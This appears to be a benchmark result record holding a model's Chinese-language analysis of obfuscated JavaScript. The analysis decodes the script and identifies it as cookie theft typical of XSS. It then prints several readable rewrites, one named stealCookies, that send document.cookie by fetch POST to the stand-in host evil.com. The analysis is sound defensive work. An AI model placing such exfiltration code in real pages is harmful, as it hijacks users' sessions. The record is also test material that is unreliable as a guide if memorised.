@@ -1,0 +1,18 @@
+{
+  "task_id": "task_04_deobfuscation",
+  "dimension": "混淆代码分析",
+  "sub_label": null,
+  "model_id": "gpt",
+  "model_name": "gpt-5.5",
+  "api_model": "gpt-5.5",
+  "run_index": 2,
+  "timestamp": "2026-07-06T15:52:58.626654",
+  "prompt_hash": "847a5556",
+  "content": "下面是对这段 JavaScript 的分析。\n\n## 1. 实际功能是什么\n\n这段代码经过了简单的字符串混淆。数组里的十六进制字符串解码后分别是：\n\n```javascript\n[\n  'cookie',\n  'fetch',\n  'https://evil.com/c',\n  'POST',\n  'stringify'\n]\n```\n\n原代码的实际逻辑是：\n\n1. 读取当前页面的 `document.cookie`\n2. 获取 `window.fetch`\n3. 向 `https://evil.com/c` 发送一个 `POST` 请求\n4. 请求体是 JSON 字符串，内容为：\n\n```json\n{\n  \"d\": \"当前页面的 cookie\"\n}\n```\n\n也就是说，它会把当前页面中 JavaScript 可访问的 Cookie 发送到 `https://evil.com/c`。\n\n---\n\n## 2. 是否有恶意行为\n\n是的，这段代码具有明显的恶意行为。\n\n它的核心行为是：\n\n```javascript\ndocument.cookie\n```\n\n读取当前站点的 Cookie，然后发送到外部域名：\n\n```javascript\nhttps://evil.com/c\n```\n\n这属于典型的 Cookie 窃取 / 数据外传行为，常见于 XSS 攻击。\n\n需要注意几点：\n\n- 如果 Cookie 设置了 `HttpOnly`，则 JavaScript 无法通过 `document.cookie` 读取到它。\n- 如果浏览器或站点配置了严格的 CSP，例如禁止向 `evil.com` 发请求，则请求可能会被拦截。\n- 即使跨域请求无法读取响应，攻击者通常并不需要读取响应，只要请求能发送出去，服务端就能收到被窃取的数据。\n\n因此，这段代码应被视为恶意代码。\n\n---\n\n## 3. 可读方式重写\n\n等价的可读版本如下：\n\n```javascript\n(function () {\n  const cookies = document.cookie;\n  const sendRequest = window.fetch;\n\n  sendRequest('https://evil.com/c', {\n    method: 'POST',\n    body: JSON.stringify({\n      d: cookies\n    })\n  });\n})();\n```\n\n进一步简化后：\n\n```javascript\nfetch('https://evil.com/c', {\n  method: 'POST',\n  body: JSON.stringify({\n    d: document.cookie\n  })\n});\n```\n\n如果加上说明性变量名，可以写成：\n\n```javascript\n(function stealCookies() {\n  const currentPageCookies = document.cookie;\n\n  fetch('https://evil.com/c', {\n    method: 'POST',\n    body: JSON.stringify({\n      d: currentPageCookies\n    })\n  });\n})();\n```\n\n这段重写后的代码清楚地表明：它在窃取当前页面 Cookie 并上传到外部服务器。",
+  "prompt_tokens": 296,
+  "completion_tokens": 817,
+  "total_tokens": 1113,
+  "elapsed_seconds": 33.97,
+  "finish_reason": "stop",
+  "status": "ok"
+}
